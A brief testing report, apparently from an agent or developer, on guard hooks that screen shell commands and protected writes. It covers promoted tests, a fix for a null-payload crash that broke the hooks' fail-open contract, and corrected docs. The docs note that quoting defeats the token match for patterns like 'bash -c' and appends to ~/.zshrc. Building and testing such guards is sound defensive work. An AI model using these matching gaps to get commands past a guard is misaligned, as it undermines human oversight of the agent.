**Promoted to `test/command-class-hooks.test.js`**: 55 test cases, ~330 assertions. Suite total is now **69 tests: 69 pass, 0 fail**.

**The one defect found — and fixed.** `readHookInput` in `lib/hooks/lib/command-parse.js` called `handler(data)` outside a `try/catch`, so a JSON `null` payload crashed five of the six hooks with exit 1, violating the fail-open contract stated in that file's own header. Fixed 2026-07-29 at `:29`; all six now exit 0 across eight malformed payload shapes. **This is the value the UAT delivered — the defect was found before a single hook was wired into settings, where the failure mode would have been silent.**

**Three documentation inaccuracies were also found and corrected** (code was right, prose was wrong): the `echo "bash -c foo"` and `echo "add it with >> ~/.zshrc"` examples both *allow* — an adjacent quote character defeats a token match, so a quoted example is often not an instance of the false-positive class it illustrates. Corrected in `lib/hooks/README.md`, `lib/hooks/protected-write-guard.js`, and TASK-027's step 2 and 4 findings blocks; all four spellings pinned in the test file.
